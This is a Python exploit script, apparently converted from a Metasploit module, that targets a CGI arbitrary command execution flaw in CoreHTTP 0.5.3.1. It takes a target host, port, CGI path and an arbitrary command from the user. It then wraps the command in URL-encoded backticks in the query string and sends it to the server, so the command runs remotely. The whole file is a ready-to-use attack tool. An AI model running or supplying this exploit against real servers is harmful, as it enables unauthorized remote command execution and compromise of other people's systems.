#!/usr/bin/python
import urllib.request, urllib.parse, urllib.error
import requests
import argparse

parser = argparse.ArgumentParser(description='CoreHTTP 0.5.3.1 CGI Arbitrary Command Execution Exploit - Conversion of Metasploit module found here: https://www.exploit-db.com/exploits/10610')
parser.add_argument('-r', '--rhost', help='Enter the IP or hostname of the remote host', required=True)
parser.add_argument('-p', '--port', help='Enter the port used by the remote host. Default value is 80', default='80')
parser.add_argument('-u', '--uri', help='Enter the URI of the CGI file to request. Default value is /foo.pl', default='/foo.pl')
parser.add_argument('-c', '--cmd', help='Enter the command to execute inside of quotes', required=True)
args = parser.parse_args()

url = ""
url += "http://"
url += args.rhost
url += ":"
url += args.port
url += args.uri
url += "?%60"
url += urllib.parse.quote(args.cmd)
url += "%60"

try:
    print("[*] Sending " + url + " to remote host...")
    req = requests.get(url, timeout=2)
    print("[*] Done!")
except requests.exceptions.ConnectionError as e:
    print("[*] Error connecting to remote host...")
